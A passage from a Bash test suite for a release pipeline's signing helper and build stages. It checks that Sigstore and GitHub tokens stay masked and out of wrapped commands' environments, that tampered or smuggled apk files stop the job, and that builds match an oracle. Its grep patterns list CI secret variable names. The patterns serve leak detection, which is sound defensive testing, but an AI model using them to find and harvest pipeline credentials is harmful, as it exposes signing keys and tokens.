  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" release-verify SLEEP=6 FAKE_TIMEOUT_SECONDS=1)
  if [ "$rc" != 0 ] && [ ! -e "$d/witness-release-verify/release-verify-collection.json" ] && [ ! -e "$d/digests.json" ]; then
    ok "AC2 $tag helper: a command that outlives the (test) timeout fails the job and leaves no record and no digests.json"
  else
    bad "AC2 $tag helper: slow command -> rc=$rc, files left: $(ls "$d/witness-release-verify" "$d/digests.json" 2> /dev/null | tr '\n' ' ')"
  fi
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" release-verify WRAPPED_RC=3)
  if [ "$rc" != 0 ] && [ ! -e "$d/witness-release-verify/release-verify-collection.json" ]; then
    ok "AC2 $tag helper: a failing command fails the job and leaves no record"
  else
    bad "AC2 $tag helper: failing command -> rc=$rc"
  fi
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" snapshot-evil); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" = 2 ] && ! grep -q '^witness ' <<< "$calls"; then
    ok "AC12 $tag helper: snapshot-evil is not a step (the snapshot names are a closed list) and exits 2 before witness is called"
  else
    bad "AC12 $tag helper: snapshot-evil -> rc=$rc calls=$calls"
  fi
  # round 1 (Codex A F1, B B2; advisor ruling 3): release-sign alone receives one masked sigstore token as SIGSTORE_ID_TOKEN; nothing else does
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" release-sign); printed=$(cat "$d/helper.out" "$d/helper.err" 2> /dev/null || true)
  if [ "$rc" = 0 ] && grep -qx 'SIGSTORE_ID_TOKEN=FAKE-JWT-TOKEN-VALUE' "$d/wrapped-env.txt" \
     && ! grep -q '^ACTIONS_ID_TOKEN_REQUEST\|^ACTIONS_RUNTIME' "$d/wrapped-env.txt" \
     && [ "$(grep -c '^::add-mask::FAKE-JWT-TOKEN-VALUE$' <<< "$printed" || true)" = 2 ] \
     && [ "$(grep -c 'FAKE-JWT-TOKEN-VALUE' <<< "$printed" || true)" = 2 ]; then
    ok "AC15 $tag helper: release-sign's command receives SIGSTORE_ID_TOKEN, no request variable, and every printed copy of a token is an add-mask line"
  else
    bad "AC15 $tag helper: release-sign -> rc=$rc env=$(grep -c 'SIGSTORE\|ACTIONS' "$d/wrapped-env.txt" 2> /dev/null) printed=$(grep -c FAKE <<< "$printed")"
  fi
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" release-assets SIGSTORE_ID_TOKEN=INHERITED-SENTINEL)
  if [ "$rc" = 0 ] && ! grep -q 'SIGSTORE_ID_TOKEN\|INHERITED-SENTINEL' "$d/wrapped-env.txt"; then
    ok "AC15 $tag helper: a SIGSTORE_ID_TOKEN already in the environment is cleared for every step (only the helper's own minted token reaches release-sign)"
  else
    bad "AC15 $tag helper: an inherited SIGSTORE_ID_TOKEN reached a step that is not release-sign (rc=$rc)"
  fi
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" release-sign SIGSTORE_ID_TOKEN=INHERITED-SENTINEL)
  if [ "$rc" = 0 ] && grep -qx 'SIGSTORE_ID_TOKEN=FAKE-JWT-TOKEN-VALUE' "$d/wrapped-env.txt" && ! grep -q INHERITED-SENTINEL "$d/wrapped-env.txt"; then
    ok "AC15 $tag helper: an inherited SIGSTORE_ID_TOKEN is replaced by the helper's own for release-sign"
  else
    bad "AC15 $tag helper: release-sign kept an inherited SIGSTORE_ID_TOKEN (rc=$rc)"
  fi
  for other in release-publish release-assets release-postverify; do
    helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" $other)
    if [ "$rc" = 0 ] && ! grep -q 'SIGSTORE_ID_TOKEN\|^ACTIONS_ID_TOKEN_REQUEST\|^ACTIONS_RUNTIME' "$d/wrapped-env.txt"; then
      ok "AC15 $tag helper: the step $other has no identity token and no request variable in its environment"
    else
      bad "AC15 $tag helper: $other's environment holds an identity token variable (rc=$rc)"
    fi
  done
  for what in "CURL_FAIL_AT=2" "CURL_EMPTY_AT=2" "CURL_NULL_AT=2"; do
    helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" release-sign "$what"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
    if [ "$rc" != 0 ] && ! grep -q '^wrapped ' <<< "$calls" && ! grep -q '^witness ' <<< "$calls"; then
      ok "AC15 $tag helper: release-sign stops (nothing runs, nothing exported) when its sigstore token fetch fails or is empty ($what)"
    else
      bad "AC15 $tag helper: $what -> rc=$rc calls=$(tr '\n' '|' <<< "$calls" | cut -c1-160)"
    fi
  done
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" evil); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" = 2 ] && ! grep -q '^witness ' <<< "$calls"; then
    ok "AC2 $tag helper: an unknown step name exits 2 before witness is called"
  else
    bad "AC2 $tag helper: unknown step -> rc=$rc calls=$calls"
  fi
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" release-verify); printed=$(cat "$d/helper.out" "$d/helper.err" 2> /dev/null || true)
  if [ "$(grep -c 'FAKE-JWT-TOKEN-VALUE' <<< "$printed" || true)" = 1 ] && grep -q '^::add-mask::' < <(grep 'FAKE-JWT-TOKEN-VALUE' <<< "$printed") \
     && ! grep -q SENTINEL-BEARER <<< "$printed"; then
    ok "AC2 $tag helper: the identity token appears only in the add-mask line and the bearer value is never printed"
  else
    bad "AC2 $tag helper: the token was printed more than in the add-mask line, or the bearer leaked"
  fi
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" release-verify)
  if [ "$rc" = 0 ] && [ "$(cat "$d/signer-token.txt" 2> /dev/null)" = FAKE-JWT-TOKEN-VALUE ] && [ -f "$d/tokfiles-while-running.txt" ] \
     && [ ! -s "$d/tokfiles-at-start.txt" ] && [ ! -s "$d/tokfiles-while-running.txt" ] && [ -z "$(ls "$d/tmp" 2> /dev/null)" ] \
     && ! grep -q FAKE-JWT-TOKEN-VALUE "$d/wrapped-env.txt"; then
    ok "AC2 $tag helper: no token file exists while the wrapped command runs, the token is in no variable of its environment, and the signer got it"
  else
    bad \
        "AC2 $tag helper: a token file or variable is left for the wrapped command, or the signer got no token" \
        "(rc=$rc, files: $(ls "$d/tmp" 2> /dev/null | tr '\n' ' '))"
  fi
  if [ -f "$d/wrapped-env.txt" ] && ! grep -Eq \
      'ACTIONS_ID_TOKEN_REQUEST|ACTIONS_RUNTIME|SENTINEL-BEARER|SENTINEL-RUNTIME|pipelines.example|runtime.example' "$d/wrapped-env.txt";
  then
    ok "AC2 $tag helper: the wrapped command's environment holds neither the identity-token nor the runtime-token variables or values"
  else bad "AC2 $tag helper: the identity-token variables or their values reach the wrapped command"; fi
done
# ---- the stage scripts RUN against fake cache scripts (REQ-CHAIN-004-AC3, AC6, AC9; REQ-CHAIN-005-AC2) ---------------------------------------
# bin/chain-test-harness.py builds a throw-away tree; the expected digests.json and items.json come from its ORACLE, never from anything the
# implementation wrote. The fixtures run with the fake chain-verify.py (MODE oracle); the real scripts run with the REAL items-apk and items-merge
# (MODE real). Each function below covers one kind, so a wrong script fails its cases and the summary still prints.
script_of() { if [ "$1" = fixture ]; then echo "$work/s-$2.sh"; else echo "$root/bin/build-stage-$2.sh"; fi; }
mk() { python3 "$harness" mktree "$1" "$2" "$3" "$4" "$5" > /dev/null; }       # mk DIR KIND SCRIPT MODE TAG
with_timeout() { # with_timeout SECONDS COMMAND...   macOS has no timeout(1): a stuck stage must fail its case, never hang the test
  local seconds=$1 pid killer status; shift
  "$@" & pid=$!
  ( sleep "$seconds"; kill "$pid" 2> /dev/null ) & killer=$!
  wait "$pid" && status=0 || status=$?
  kill "$killer" 2> /dev/null; wait "$killer" 2> /dev/null || true
  return "$status"
}
run_stage() { # run_stage DIR KIND MODE TAG [ENV=VAL...] -> the exit status (124 if it hangs); GH_TOKEN is set as the apk job's Witness step sets it
  local dir=$1 kind=$2 mode=$3 tag=$4; shift 4
  ( cd "$dir" && if with_timeout 120 env GITHUB_ACTIONS=true "$@" GITHUB_REF_NAME="${REF_NAME:-$tag}" TAG="$tag" ITEMS_MODE="$mode" \
        HARNESS_DIR="$root/bin" REAL_CV="$CV" \
        GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 GH_TOKEN=SENTINEL-GH-TOKEN PATH="$dir/bin:$PATH" \
        bash "./bin/build-stage-$kind.sh" > stage.out 2> stage.err; then echo 0; else echo $?; fi )
}
n_calls() { grep -c -- "$1" "$2/calls.log" 2> /dev/null || true; }                         # n_calls REGEX DIR
line_of() { grep -n -- "$1" "$2/calls.log" 2> /dev/null | head -1 | cut -d: -f1 || true; }  # line_of REGEX DIR
json_of() { python3 -c 'import json,sys; print(json.dumps(json.load(open(sys.argv[1])), sort_keys=True))' "$1" 2> /dev/null || true; }
oracle() { python3 "$harness" "$@" 2> /dev/null || true; }
fails() { # fails DIR SCRIPT MODE TAG LABEL ENVVAR NOT-CALLED-REGEX   a stage that is made to fail must exit non-zero, leave no fragment, and not go on
  local d=$1 rc calls; mk "$d" apk "$2" "$3" "$4"; rc=$(run_stage "$d" apk "$3" "$4" "$6"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" != 0 ] && [ ! -e "$d/out/items-apk.json" ] && { [ -z "$7" ] || ! grep -Eq -- "$7" <<< "$calls"; }; then
    ok "AC6 apk: $5"
  else
    bad "AC6 apk: $5 -> rc=$rc calls=$(tr '\n' '|' <<< "$calls" | cut -c1-160)"
  fi
}
beh_apk() { # beh_apk TAGNAME SCRIPT MODE VERSIONTAG
  local t=$1 s=$2 mode=$3 v=$4 d="$work/b-apk-$1-$4" rc calls pk
  pk=$(oracle apkname standard "$v"); pk=${pk#fscache-}; pk=${pk%-r0.apk}
  mk "$d" apk "$s" "$mode" "$v"; rc=$(run_stage "$d" apk "$mode" "$v"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" = 0 ] && [ "$(sed -n 1p <<< "$calls")" = "admit gh=yes" ] && [ "$(n_calls '^apk ' "$d")" = 2 ] && [ "$(n_calls '^version ' "$d")" = 2 ]; then
    ok "AC3 $t apk $v: admission is the first call (and holds the token), then both variants build, then both version checks"
  else
    bad "AC3 $t apk $v: exit $rc, calls: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
  fi
  if grep -Fq "version standard $(oracle apkname standard "$v")" <<< "$calls" && grep -Fq "version fips $(oracle apkname fips "$v")" <<< "$calls" \
     && [ "$(n_calls "--version ${v#v} " "$d")" = 2 ]; then
    ok "AC3 $t apk $v: --version is the tag minus v (${v#v}) and the version check finds fscache-$pk-r0.apk and the fips apk (PROPOSED names)"
  else
    bad "AC3 $t apk $v: version or apk names: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
  fi
  if [ "$(n_calls 'SDE=1700000000' "$d")" = 2 ] && ! grep -q 'SDE=unset' "$d/calls.log"; then
    ok "AC6 $t apk $v: SOURCE_DATE_EPOCH (the tagged commit's time from cache's script) reaches both builds"
  else
    bad "AC6 $t apk $v: SOURCE_DATE_EPOCH not exported to both builds"
  fi
  if [ -f "$d/env-apk.txt" ] && ! grep -Eq '^(GH_TOKEN|APK_RELEASE_SIGNING_KEY|GOPROXY|HTTPS_PROXY|HTTP_PROXY|https_proxy)=' "$d/env-apk.txt" \
     && ! grep -q 'SENTINEL-GH-TOKEN' "$d/env-apk.txt"; then
    ok "AC6 $t apk $v: cache's script sees no GH_TOKEN (not the name, not the value) and none of the variables it refuses"
  else
    bad "AC6 $t apk $v: GH_TOKEN or a refused variable reached build-apk.sh"
  fi
  if [ "$(json_of "$d/out/items-apk.json")" = "$(oracle fragment "$(uname -m)" "$v")" ]; then
    ok "AC9 $t apk $v: out/items-apk.json (inside the uploaded directory) is exactly the oracle's fragment"
  else
    bad "AC9 $t apk $v: out/items-apk.json differs from the oracle"
  fi
  if [ "$v" = v0.3.0 ]; then
    mk "$d" apk "$s" "$mode" "$v"; run_stage "$d" apk "$mode" "$v" > /dev/null
    if [ "$(wc -l < "$d/gh.log" 2> /dev/null || echo 0)" -ge 1 ]; then
      ok "AC12 $t apk: the release run makes the admission's reads through gh (the contrast of the snapshot runs' zero gh calls)"
    else
      bad "AC12 $t apk: the release run made no gh call: the zero of the snapshot cases would prove nothing"
    fi
    fails "$d" "$s" "$mode" "$v" "a refused admission runs nothing else (no build, no version check)" FAKE_ADMIT_RC=1 '^apk |^version '
    fails "$d" "$s" "$mode" "$v" "a failing --print-source-date-epoch stops the job before any build (the export cannot mask it)" FAKE_SDE_RC=1 '^apk '
    fails "$d" "$s" "$mode" "$v" "build-apk.sh exit 2 (a named refusal) stops before the version checks" FAKE_APK_RC=2 '^version '
    fails "$d" "$s" "$mode" "$v" "build-apk.sh exit 4 (a network attempt in the sealed call) stops before the version checks" FAKE_APK_RC=4 '^version '
    fails "$d" "$s" "$mode" "$v" "a refused version check fails the job and leaves no items fragment" FAKE_VERSION_RC=1 ''
  fi
}
beh_assemble() { # beh_assemble TAGNAME SCRIPT MODE VERSIONTAG
  local t=$1 s=$2 mode=$3 v=$4 d="$work/b-asm-$1-$4" rc calls nv nb ni gd gi
  mk "$d" assemble "$s" "$mode" "$v"; rc=$(run_stage "$d" assemble "$mode" "$v"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  nv=$(line_of 'verify verify ' "$d"); nb=$(line_of 'verify bind ' "$d"); ni=$(line_of '^image ' "$d")
  if [ "$rc" = 0 ] && [ -z "$nv" ] && [ "$(n_calls 'verify bind --local --step apk' "$d")" = 2 ] \
     && [ -n "$nb" ] && [ -n "$ni" ] && [ "$nb" -lt "$ni" ]; then
    ok "AC3 $t assemble $v: no verify (the apk records are local, unsigned), both artifact directories are bound to them, then the repo is built, then the images"
  else
    bad "AC3 $t assemble $v: rc=$rc verify=$nv bind=$nb image=$ni"
  fi
  if [ "$(n_calls 'SDE=1700000000' "$d")" = 3 ] && ! grep -q 'SDE=unset' "$d/calls.log"; then
    ok "AC6 $t assemble $v: SOURCE_DATE_EPOCH reaches both image builds and the archives"
  else
    bad "AC6 $t assemble $v: SOURCE_DATE_EPOCH missing on an image build or the archives"
  fi
  if [ -f "$d/melange-repo/x86_64/$(oracle apkname standard "$v")" ] && [ -d "$d/melange-repo/aarch64" ]; then
    ok "AC3 $t assemble $v: the melange repo holds both architectures' apks, each from its own verified directory"
  else
    bad "AC3 $t assemble $v: the melange repo is incomplete"
  fi
  gd=$(json_of "$d/digests.json"); gi=$(json_of "$d/items.json")
  if [ "$rc" = 0 ] && [ "$gd" = "$(oracle expect "$d" assemble digests "$v")" ] && [ -n "$gd" ]; then
    ok "AC9 $t assemble $v: digests.json is exactly the oracle's (2 images, 4 apks by apk-tool digest, 4 archives)"
  else
    bad "AC9 $t assemble $v: rc=$rc digests.json differs from the oracle (got '${gd:0:100}')"
  fi
  if [ "$rc" = 0 ] && [ "$gi" = "$(oracle expect "$d" assemble items "$v")" ] && [ -n "$gi" ]; then
    ok "AC9 $t assemble $v: items.json is exactly the oracle's 29 items"
  else
    bad "AC9 $t assemble $v: rc=$rc items.json differs from the oracle (got '${gi:0:100}')"
  fi
  if [ -n "$gd" ] && python3 - "$d" <<'PY'
import json, re, sys
digests = json.load(open(sys.argv[1] + "/digests.json")); items = json.load(open(sys.argv[1] + "/items.json"))
assert len(digests) == 10, "digests.json must hold exactly the ten digests"
for name, value in digests.items():             # PR 1's schema (REQ-CHAIN-001-AC2): names [a-z0-9-]+, values sha256 and 64 lower-case hex
    assert re.fullmatch(r"[a-z0-9-]+", name) and re.fullmatch(r"sha256:[0-9a-f]{64}", value), name
    item = name.replace("-amd64", "-x86_64").replace("-arm64", "-aarch64") if name.startswith("apk-") else name
    assert items[item] == value, name
PY
  then ok "AC9 $t assemble $v: digests.json passes PR 1's schema and equals items.json for the same names"
  else bad "AC9 $t assemble $v: digests.json off-schema or unequal to items.json"
  fi
  mk "$d" assemble "$s" "$mode" "$v"; rc=$(run_stage "$d" assemble "$mode" "$v")
  if [ "$rc" = 0 ] && python3 - "$d" "$harness" "$v" <<'PY'
import importlib.util, json, os, subprocess, sys
d, harness, tag = sys.argv[1], sys.argv[2], sys.argv[3]
spec = importlib.util.spec_from_file_location("h", harness); h = importlib.util.module_from_spec(spec); spec.loader.exec_module(h)
vex = ".vex/fosterstack-cache.openvex.json"
items = json.load(open(d + "/items.json"))
for image in ("production", "fips"):
    base = h.image_outputs(image, tag)["digest"]                      # the built index, from the oracle
    layout = "out/" + image
    r = subprocess.run([sys.executable, "bin/vex-index.py", "verify-layout", "--layout", layout, "--vex", vex, "--base-digest", base], cwd=d, capture_output=True, text=True)
    assert r.returncode == 0, "%s: verify-layout: %s" % (image, r.stderr)           # AC1: exactly one attestation child per platform carrying the file; AC3: the rest unchanged
    top = json.load(open("%s/%s/index.json" % (d, layout)))
    final = top["manifests"][0]["digest"]
    assert final != base and items["image-" + image] == final == open("%s/out/%s.digest" % (d, image)).read().strip(), image   # the digest Build records is the final index's
    fb = open("%s/%s/blobs/sha256/%s" % (d, layout, final.split(":")[1]), "rb").read()
    kids = json.loads(fb)["manifests"]
    atts = [k for k in kids if (k.get("annotations") or {}).get("vnd.docker.reference.type") == "attestation-manifest"]
    assert len(kids) == 4 and len(atts) == 2, image                                  # two platforms, one attestation child each
    assert kids[:2] == json.loads(open("%s/%s/blobs/sha256/%s" % (d, layout, base.split(":")[1]), "rb").read())["manifests"], image   # AC3: the original entries first and unchanged
    # "content" cannot drift into "roughly the same" (advisor, Oct 16): every attestation's statement holds the VEX document in Scout's form, and a copy of the file with ONE value changed
    # (a statement's impact text, then the document's version) is refused by the layout check
    doc = json.load(open(d + "/" + vex))
    IMG = "pkg:oci/cache?repository_url=ghcr.io/fosterstack/cache"
    def scout_form(vex):   # REQ-REL-010-AC1: the image's own product with subcomponents is replaced by them (once each, in order); any other product is unchanged
        out = json.loads(json.dumps(vex))
        for st in out["statements"]:
            products = []
            for p in st["products"]:
                for q in (p["subcomponents"] if IMG in (p.get("@id"), (p.get("identifiers") or {}).get("purl")) and p.get("subcomponents") else [p]):
                    if q not in products:
                        products.append(q)
            st["products"] = products
        return out
    blob = lambda dg: open("%s/%s/blobs/sha256/%s" % (d, layout, dg.split(":")[1]), "rb").read()
    for att in atts:
        manifest = json.loads(blob(att["digest"]))
        statement = json.loads(blob(manifest["layers"][0]["digest"]))
        assert statement["predicate"] == scout_form(doc), "%s: an attestation does not hold the VEX document in the form Docker Scout applies" % image
    for label, edit in (("impact text", lambda x: x["statements"][0].__setitem__("impact_statement", str(x["statements"][0].get("impact_statement", "")) + " changed")),
                        ("document version", lambda x: x.__setitem__("version", x["version"] + 1))):
        other = json.loads(json.dumps(doc)); edit(other)
        json.dump(other, open(d + "/other-vex.json", "w"))
        r = subprocess.run([sys.executable, "bin/vex-index.py", "verify-layout", "--layout", layout, "--vex", "other-vex.json", "--base-digest", base], cwd=d, capture_output=True, text=True)
        assert r.returncode == 2, "%s: a VEX file with a changed %s was accepted by verify-layout" % (image, label)
PY
  then ok "REQ-REL-010-AC1/AC3 $t assemble $v: each image's index is the final index (one attestation child per platform, the rest as built), and Build records its digest"
  else bad "REQ-REL-010-AC1/AC3 $t assemble $v: rc=$rc, the final index is not what the VEX attach must leave"
  fi
  if [ "$v" = v0.3.0 ]; then
    for what in missing empty notjson; do
      mk "$d" assemble "$s" "$mode" "$v"
      case "$what" in missing) rm "$d/.vex/fosterstack-cache.openvex.json" ;; empty) printf '{}' > "$d/.vex/fosterstack-cache.openvex.json" ;;
                      notjson) printf 'not json' > "$d/.vex/fosterstack-cache.openvex.json" ;; esac
      rc=$(run_stage "$d" assemble "$mode" "$v")
      if [ "$rc" != 0 ] && [ ! -e "$d/digests.json" ] && [ ! -e "$d/items.json" ]; then
        ok "REQ-REL-010-AC1 $t assemble: a VEX file that is $what stops Build before digests.json is written"
      else
        bad "REQ-REL-010-AC1 $t assemble: a VEX file that is $what -> rc=$rc digests=$([ -e "$d/digests.json" ] && echo written || echo absent)"
      fi
    done
  fi
  if [ "$v" = v0.3.0 ]; then
    mk "$d" assemble "$s" "$mode" "$v"; rc=$(run_stage "$d" assemble "$mode" "$v" FAKE_BIND_RC=1); calls=$(cat "$d/calls.log" 2> /dev/null || true)
    if [ "$rc" != 0 ] && ! grep -q '^image ' <<< "$calls" && [ ! -e "$d/digests.json" ]; then
      ok "AC3 $t assemble: a refused apk record stops the job before any image"
    else
      bad "AC3 $t assemble: refused record -> rc=$rc"
    fi
    mk "$d" assemble "$s" "$mode" "$v"
    printf 'tampered' >> "$d/apk/ubuntu-24.04-arm/aarch64/fscache-0.3.0-r0.apk"
    rc=$(run_stage "$d" assemble "$mode" "$v")
    calls=$(cat "$d/calls.log" 2> /dev/null || true)
    if [ "$rc" != 0 ] && ! grep -q '^image ' <<< "$calls" && [ ! -e "$d/digests.json" ]; then
      ok "AC3 $t assemble: an apk whose bytes differ from the verified record stops the job before any image (rule 58)"
    else
      bad "AC3 $t assemble: tampered apk -> rc=$rc"
    fi
    mk "$d" assemble "$s" "$mode" "$v"; printf 'extra' > "$d/apk/ubuntu-24.04/x86_64/smuggled.apk"; rc=$(run_stage "$d" assemble "$mode" "$v")
    if [ "$rc" != 0 ] && [ ! -e "$d/digests.json" ]; then
      ok "AC3 $t assemble: a file in the artifact that the record does not hold stops the job"
    else
      bad "AC3 $t assemble: smuggled file -> rc=$rc"
    fi
    mk "$d" assemble "$s" "$mode" "$v"; rc=$(run_stage "$d" assemble "$mode" "$v" FAKE_IMAGE_RC=4)
    if [ "$rc" != 0 ] && [ ! -e "$d/digests.json" ] && [ ! -e "$d/items.json" ]; then
      ok "AC6 $t assemble: assemble-image.sh failing (exit 4) leaves no digests.json"
    else
      bad "AC6 $t assemble: image failure -> rc=$rc"
    fi
  fi
}
beh_rebuild_apk() { # beh_rebuild_apk TAGNAME SCRIPT MODE VERSIONTAG
  local t=$1 s=$2 mode=$3 v=$4 d="$work/b-rba-$1-$4" rc calls ns nb
  mk "$d" rebuild-apk "$s" "$mode" "$v"; rc=$(run_stage "$d" rebuild-apk "$mode" "$v"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  ns=$(line_of 'verify stage-start' "$d"); nb=$(line_of '^apk ' "$d")
  if [ "$rc" = 0 ] && [ -n "$ns" ] && [ -n "$nb" ] && [ "$ns" -lt "$nb" ] && [ "$(n_calls 'SDE=1700000000' "$d")" = 2 ] \
     && [ -f "$d/out/items-apk.json" ]; then
    ok "005-AC2 $t rebuild-apk $v: Build's record is verified FIRST, then the same builds with the same date, then the fragment"
  else
    bad "005-AC2 $t rebuild-apk $v: rc=$rc stage-start=$ns build=$nb"
  fi
  if [ "$v" = v0.3.0 ]; then
    mk "$d" rebuild-apk "$s" "$mode" "$v"; rc=$(run_stage "$d" rebuild-apk "$mode" "$v" FAKE_VERIFY_RC=1); calls=$(cat "$d/calls.log" 2> /dev/null || true)
    if [ "$rc" != 0 ] && ! grep -q '^apk ' <<< "$calls"; then
      ok "005-AC2 $t rebuild-apk: a refused Build record runs no build"
    else
      bad "005-AC2 $t rebuild-apk: refused record -> rc=$rc"
    fi
  fi
}
beh_rebuild_assemble() { # beh_rebuild_assemble TAGNAME SCRIPT MODE VERSIONTAG
  local t=$1 s=$2 mode=$3 v=$4 d="$work/b-rbs-$1-$4" rc calls n1 n2 n3 n4 n5 n6
  mk "$d" rebuild-assemble "$s" "$mode" "$v"
  printf '{"image-fips":"sha256:%s","image-production":"sha256:%s"}' "$(printf f | sha256sum | cut -c1-64)" "$(printf p | sha256sum | cut -c1-64)" > "$d/build-in/digests.json"   # the digest list Build attested, not the harness' empty one
  rc=$(run_stage "$d" rebuild-assemble "$mode" "$v"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  # REQ-CHAIN-005-AC2 (Astra R2): Rebuild's own record must carry the product file:digests.json with Build's bytes, because Release's stage-start for Rebuild compares the sha256 of Build's digest file with it
  if [ "$rc" = 0 ] && [ -f "$d/digests.json" ] && [ ! -L "$d/digests.json" ] && cmp -s "$d/digests.json" "$d/build-in/digests.json" && [ -s "$d/digests.json" ]; then
    ok "005-AC2 $t rebuild-assemble $v: digests.json at the repository root is the verified digest list byte for byte (the product Release's stage-start asks Rebuild's record for)"
  else
    bad "005-AC2 $t rebuild-assemble $v: no byte-identical root digests.json (rc=$rc, $(ls "$d" 2> /dev/null | tr '\n' ' ' | head -c 120))"
  fi
  n1=$(line_of 'verify stage-start' "$d")
  n2=$(line_of 'verify policy' "$d")
  n3=$(line_of 'verify bind ' "$d")
  n4=$(line_of '^image ' "$d")
  n5=$(line_of 'verify items-merge' "$d")
  n6=$(line_of 'verify rebuild-compare' "$d")
  if [ "$rc" = 0 ] && [ -n "$n1" ] && [ -n "$n2" ] && [ -n "$n3" ] && [ -n "$n4" ] && [ -n "$n5" ] && [ -n "$n6" ] && [ "$n2" -lt "$n1" ] \
     && [ "$n1" -lt "$n3" ] && [ "$n3" -lt "$n4" ] && [ "$n4" -lt "$n5" ] && [ "$n5" -lt "$n6" ]; then
    ok "005-AC2 $t rebuild-assemble $v: policy, stage-start (Build's signed record), local binds, images, merge, compare in that order"
  else
    bad "005-AC2 $t rebuild-assemble $v: rc=$rc order=$n1 $n2 $n3 $n4 $n5 $n6"
  fi
  if [ "$rc" = 0 ] && jq -e '.equal == true' "$d/witness-rebuild/verdict.json" > /dev/null 2>&1; then
    ok "005-AC3 $t rebuild-assemble $v: an identical rebuild writes an equal verdict"
  else
    bad "005-AC3 $t rebuild-assemble $v: rc=$rc verdict=$(head -c 100 "$d/witness-rebuild/verdict.json" 2> /dev/null)"
  fi
  if [ "$v" = v0.3.0 ]; then
    mk "$d" rebuild-assemble "$s" "$mode" "$v"
    python3 - "$d/build-in/items.json" <<'PY'
import json, sys
p = sys.argv[1]; items = json.load(open(p)); k = "image-fips"; items[k] = items[k][:-1] + ("0" if items[k][-1] != "0" else "1"); json.dump(items, open(p, "w"))
PY
    rc=$(run_stage "$d" rebuild-assemble "$mode" "$v")
    if [ "$rc" != 0 ] && jq -e '.equal == false' "$d/witness-rebuild/verdict.json" > /dev/null 2>&1 && grep -q 'image-fips' "$d/stage.err"; then
      ok "005-AC3 $t rebuild-assemble: a differing Build item blocks the job and the verdict names it"
    else
      bad "005-AC3 $t rebuild-assemble: differing item -> rc=$rc"
    fi
    mk "$d" rebuild-assemble "$s" "$mode" "$v"
    python3 - "$d/.vex/fosterstack-cache.openvex.json" <<'PY'
import json, sys
p = sys.argv[1]; doc = json.load(open(p)); doc["version"] = doc["version"] + 1; json.dump(doc, open(p, "w"))
PY
    rc=$(run_stage "$d" rebuild-assemble "$mode" "$v")
    if [ "$rc" != 0 ] && jq -e '.equal == false' "$d/witness-rebuild/verdict.json" > /dev/null 2>&1 && grep -q 'image-production' "$d/stage.err"; then
      ok "REQ-REL-010-AC2 $t rebuild-assemble: a VEX file that differs from Build's changes the final index and Rebuild's comparison blocks on the image digest"
    else
      bad "REQ-REL-010-AC2 $t rebuild-assemble: a different VEX file -> rc=$rc"
    fi
    mk "$d" rebuild-assemble "$s" "$mode" "$v"
    rc=$(run_stage "$d" rebuild-assemble "$mode" "$v" FAKE_BIND_RC=1)
    calls=$(cat "$d/calls.log" 2> /dev/null || true)
    if [ "$rc" != 0 ] && ! grep -q '^image ' <<< "$calls"; then
      ok "005-AC2 $t rebuild-assemble: a refused record stops the job before any image"
    else
      bad "005-AC2 $t rebuild-assemble: refused record -> rc=$rc"
    fi
  fi
}
# ---- the snapshot scripts RUN against the same fakes (REQ-CHAIN-004-AC12): no tag, no admission, no version check, no policy, no verify ---------------
# The run is a pull request's: GITHUB_REF_NAME is 123/merge, which is no tag, so a snapshot script that read the tag would fail or pass a wrong version.
# The version cache's scripts get is the fixed snapshot one; the oracle is computed for the tag v0.0.0-rc.1 that names it.
SNAP_TAG=v0.0.0-rc.1
# tag_cases KIND AC TAGNAME SCRIPT MODE DIR: what the snapshot apk scripts do with the tags at HEAD (two cases).
# Go stamps the HIGHEST semver tag at HEAD, so every other
# local v* tag is deleted first (git tag -d, never pushed or fetched), then v0.0.0-rc.1 is made, then any tag left over (a non-v* tag) is refused by name.
tag_cases() {
  local kind=$1 ac=$2 t=$3 s=$4 mode=$5 d=$6 rc calls del forced firstbuild
  mk "$d" "$kind" "$s" "$mode" "$SNAP_TAG"
  rc=$(run_stage "$d" "$kind" "$mode" "$SNAP_TAG" "FAKE_TAGS_AT_HEAD=v0.3.0 v0.2.9"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  del=$(line_of 'git tag -d v0.3.0' "$d"); forced=$(line_of 'git tag --force v0.0.0-rc.1 HEAD' "$d"); firstbuild=$(line_of '^apk ' "$d")
  if [ "$rc" = 0 ] && [ -n "$del" ] && [ -n "$forced" ] && [ -n "$firstbuild" ] && [ "$del" -lt "$forced" ] && [ "$forced" -lt "$firstbuild" ] \
     && [ "$(n_calls 'git tag -d v0.2.9' "$d")" = 1 ] && [ "$(n_calls 'git tag -d v0.3.0' "$d")" = 1 ] && ! grep -q 'git tag -d v0.0.0-rc.1' <<< "$calls" \
     && [ "$(cat "$d/fake-tags.txt")" = v0.0.0-rc.1 ] && ! grep -Eq 'git (push|fetch)' <<< "$calls" \
     && [ "$(n_calls "--version ${SNAP_TAG#v} " "$d")" = 2 ]; then
    ok "$ac $t $kind: the other local v* tags at HEAD (v0.3.0, v0.2.9) are deleted BEFORE v0.0.0-rc.1 is made and before any build; nothing pushed or fetched"
  else
    bad "$ac $t $kind: v0.3.0 v0.2.9 at HEAD -> rc=$rc, tags left: $(tr '\n' ' ' < "$d/fake-tags.txt" 2> /dev/null)," \
        "calls: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
  fi
